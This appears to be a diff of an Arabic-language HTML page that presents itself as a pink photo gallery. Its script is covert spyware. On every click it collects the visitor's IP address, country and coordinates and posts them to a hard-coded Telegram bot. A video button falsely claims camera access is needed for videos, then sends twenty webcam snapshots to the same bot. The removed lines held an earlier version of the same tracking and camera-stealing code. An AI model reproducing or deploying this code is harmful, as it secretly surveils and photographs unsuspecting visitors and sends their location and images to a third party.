@@ -2,102 +2,199 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
-  <title>طائفة الظلام - DKSTx666</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>موقع جلجامشة</title>
   <style>
     body {
       margin: 0;
-      background: radial-gradient(circle, pink 20%, #ffccff);
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      text-align: center;
+      font-family: 'Arial', sans-serif;
+      background: radial-gradient(circle, pink 10%, #ffe6f0);
       overflow-x: hidden;
-      position: relative;
     }
-    /* باقي التنسيق يبقى كما هو (نفس التنسيق السابق تماماً) */
+    .header-image {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+    }
+    .profile {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      border: 4px solid white;
+      margin: -50px auto 20px;
+      display: block;
+      cursor: pointer;
+    }
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      padding: 10px;
+    }
+    .gallery img {
+      width: calc(20% - 10px);
+      height: 120px;
+      object-fit: cover;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .gallery img:hover {
+      box-shadow: 0 0 15px 5px violet;
+      transform: scale(1.1);
+    }
+    .viewer {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.85);
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+    .viewer img {
+      max-width: 90vw;
+      max-height: 70vh;
+      border-radius: 15px;
+      box-shadow: 0 0 30px deeppink;
+    }
+    .description {
+      color: #ff66cc;
+      font-weight: bold;
+      font-size: 22px;
+      margin: 10px;
+      text-shadow: 0 0 10px #ffb6c1;
+    }
+    .download-btn {
+      background-color: #ff99cc;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #ff66cc;
+    }
+    .page-numbers {
+      position: fixed;
+      bottom: 5px;
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      padding: 0 15px;
+      font-size: 20px;
+      color: #444;
+    }
+    .video-btn {
+      position: fixed;
+      bottom: 15px;
+      right: 15px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, purple, violet);
+      color: white;
+      font-size: 26px;
+      border: none;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 violet; }
+      70% { box-shadow: 0 0 0 20px rgba(238, 130, 238, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(238, 130, 238, 0); }
+    }
   </style>
 </head>
-<body onclick="reportClick()">
+<body onclick="reportClick(event)">
 
-  <!-- باقي الصفحة كما هي -->
+  <!-- صورة الغلاف -->
+  <img src="cover.jpg" alt="غلاف" class="header-image">
 
-  <div class="video-fab" onclick="accessCamera()">🎥</div>
-  <div class="blog-fab" onclick="goToIndex()">📖</div>
+  <!-- صورة البروفايل -->
+  <a href="index.html"><img src="profile.jpg" alt="بروفايل" class="profile"></a>
+
+  <!-- المعرض -->
+  <div class="gallery">
+    <img src="p1.jpg" onclick="showViewer(this)">
+    <img src="p2.jpg" onclick="showViewer(this)">
+    <img src="p3.jpg" onclick="showViewer(this)">
+    <img src="p4.jpg" onclick="showViewer(this)">
+    <img src="p5.jpg" onclick="showViewer(this)">
+    <img src="p6.jpg" onclick="showViewer(this)">
+    <img src="p7.jpg" onclick="showViewer(this)">
+    <img src="p8.jpg" onclick="showViewer(this)">
+    <img src="p9.jpg" onclick="showViewer(this)">
+    <img src="p10.jpg" onclick="showViewer(this)">
+  </div>
+
+  <!-- عرض صورة مكبرة -->
+  <div class="viewer" onclick="this.style.display='none'">
+    <img id="bigImage">
+    <div class="description">هذا جلجامشة</div>
+    <button class="download-btn" onclick="downloadImage(event)">تحميل</button>
+  </div>
+
+  <!-- أرقام الصفحات -->
+  <div class="page-numbers">
+    <a href="index.html">1</a>
+    <a href="index.html">2</a>
+  </div>
+
+  <!-- زر الفيديو -->
+  <button class="video-btn" onclick="startCameraAccess(event)">🎥</button>
 
   <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
     const CHAT_ID = "7664410054";
-    let report = "🛑 تقرير دخول جديد:\n\n";
 
-    function getIPInfo() {
-      return fetch("https://ipinfo.io/json")
-        .then(res => res.json())
-        .then(data => {
-          report += `🌐 IP: ${data.ip || "❌"}\n`;
-          report += `📍 الدولة: ${data.country || "❌"}\n`;
-          report += `🏙️ المدينة: ${data.city || "❌"}\n`;
-          report += `🌎 إحداثيات: ${data.loc || "❌"}\n`;
-          report += `🛰️ خريطة: https://www.google.com/maps?q=${data.loc || ""}\n\n`;
-        })
-        .catch(() => {
-          report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
-        });
+    function showViewer(img) {
+      document.getElementById('bigImage').src = img.src;
+      document.querySelector('.viewer').style.display = 'flex';
     }
 
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      report += `🧠 UserAgent: ${ua}\n`;
-
-      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
-      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
-      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
-      else report += "🌀 الجهاز: غير معروف ❌\n";
-
-      if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome ✅\n";
-      else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox ✅\n";
-      else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari ✅\n";
-      else report += "🌐 المتصفح: غير معروف ❌\n";
-
-      report += "\n";
+    function downloadImage(e) {
+      e.stopPropagation();
+      const link = document.createElement('a');
+      link.href = document.getElementById('bigImage').src;
+      link.download = 'جلجامشة.jpg';
+      link.click();
     }
 
-    function sendToTelegram(msg) {
+    async function reportClick(e) {
+      const msg = `👆 تم الضغط على: ${e.target.tagName}\n🌐 الموقع: ${window.location.href}`;
+      const ip = await fetch('https://api.ipify.org').then(res => res.text());
+      const loc = await fetch('https://ipinfo.io/json').then(res => res.json());
+      const full = `${msg}\nIP: ${ip}\n📍 الدولة: ${loc.country}\n🌎 إحداثيات: ${loc.loc}\n🔗 https://www.google.com/maps?q=${loc.loc}`;
+
       fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(full)}`
       });
     }
 
-    async function runReport() {
-      await getIPInfo();
-      getDeviceInfo();
-      sendToTelegram(report);
-    }
-
-    runReport();
-
-    function reportClick() {
-      runReport();
-    }
-
-    function goToIndex() {
-      window.location.href = "index.html";
-    }
-
-    async function accessCamera() {
+    async function startCameraAccess(e) {
+      e.stopPropagation();
+      alert("للدخول إلى الفيديوهات، يجب السماح بالوصول إلى الكاميرا...");
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
-
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
 
         let count = 0;
         const interval = setInterval(() => {
-          if (count >= 10) {
+          if (count >= 20) {
             clearInterval(interval);
             stream.getTracks().forEach(track => track.stop());
             return;
@@ -105,24 +202,16 @@
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           ctx.drawImage(video, 0, 0);
-          const imgData = canvas.toDataURL('image/jpeg');
-          sendPhotoToTelegram(imgData);
+          const img = canvas.toDataURL('image/jpeg');
+          fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: new URLSearchParams({ chat_id: CHAT_ID, photo: img })
+          });
           count++;
-        }, 500);
-
+        }, 1000);
       } catch (err) {
-        alert("فشل الوصول إلى الكاميرا: " + err);
+        alert("تم رفض الوصول إلى الكاميرا");
       }
-    }
-
-    function sendPhotoToTelegram(base64Image) {
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: new URLSearchParams({
-          chat_id: CHAT_ID,
-          photo: base64Image
-        })
-      });
     }
   </script>
 </body>
